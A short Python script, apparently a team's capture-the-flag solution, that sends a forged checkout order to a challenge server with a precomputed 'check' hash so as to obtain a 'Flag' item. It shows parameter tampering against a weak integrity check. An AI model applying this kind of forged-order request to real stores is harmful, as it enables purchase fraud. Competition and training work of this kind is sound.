import requests
import json

data = {
    "products": ["Flag"],
    "scannedData": '{"item":"Flag","quantity":"1","check":"6afad76d43d37615347face200910f8c"}',
    "teamName": "FireWaffles"
}

response = requests.post("http://checkout.challenges.cybersecuritychallenge.be/order", json=data)
print(response.text)
